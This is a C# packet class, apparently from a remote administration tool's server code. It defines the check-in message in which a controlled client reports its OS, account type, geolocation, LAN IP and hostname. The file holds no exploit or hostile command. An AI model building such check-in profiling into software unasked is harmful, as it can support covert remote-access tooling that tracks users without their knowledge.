using ProtoBuf;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class Initialize : IPacket
    {
        [ProtoMember(1)]
        public string Version { get; set; }

        [ProtoMember(2)]
        public string OperatingSystem { get; set; }

        [ProtoMember(3)]
        public string AccountType { get; set; }

        [ProtoMember(4)]
        public string Country { get; set; }

        [ProtoMember(5)]
        public string CountryCode { get; set; }

        [ProtoMember(6)]
        public string Region { get; set; }

        [ProtoMember(7)]
        public string City { get; set; }

        [ProtoMember(8)]
        public int ImageIndex { get; set; }

        [ProtoMember(9)]
        public string Id { get; set; }
        [ProtoMember(10)]
        public string Lanip { get; set; }

        [ProtoMember(11)]
        public string HostName { get; set; }

        public Initialize()
        {
        }

        public Initialize(string version, string operatingsystem, string accounttype, string country, string countrycode,
            string region, string city, int imageindex, string id, string lanip, string hostname)
        {
            Version = version;
            OperatingSystem = operatingsystem;
            AccountType = accounttype;
            Country = country;
            CountryCode = countrycode;
            Region = region;
            City = city;
            ImageIndex = imageindex;
            Id = id;
            Lanip = lanip;
            HostName = hostname;

        }

        public void Execute(Client client)
        {
            client.Send<Initialize>(this);
        }
    }
}